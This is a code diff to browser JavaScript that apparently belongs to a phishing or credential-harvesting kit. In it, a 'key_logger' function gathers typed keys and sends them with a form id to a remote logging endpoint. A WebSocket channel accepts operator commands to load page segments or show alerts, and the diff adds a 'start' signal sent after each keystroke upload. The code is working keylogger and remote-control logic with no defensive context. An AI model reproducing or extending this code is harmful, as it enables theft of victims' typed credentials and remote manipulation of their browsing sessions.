@@ -18,6 +18,8 @@ async function load_segment(url) {
     // message is received
     socket.addEventListener("message", (event) => {
       const { action, payload } = JSON.parse(event.data)
+
+      if (action === "alert") alert(payload)
       if (action === "load_segment") load_segment(payload)
     })
 
@@ -48,7 +50,7 @@ window.logger_callback = async (url, data_logger, show_alert = false) => {
 
       if (show_alert) {
         const data = await response.json()
-        alert(data.message)
+        data.message && alert(data.message)
       }
     } catch (error) {
       show_alert && alert(error.message)
@@ -72,8 +74,9 @@ window.key_logger = function (data) {
       window.key_logger_timeout = null
     }
 
-    window.key_logger_timeout = setTimeout(() => {
-      window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
+    window.key_logger_timeout = setTimeout(async () => {
+      await window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
+      if (window.socket) window.socket.send(JSON.stringify({ action: "start", payload: window.fid }))
     }, 3000)
   }
 
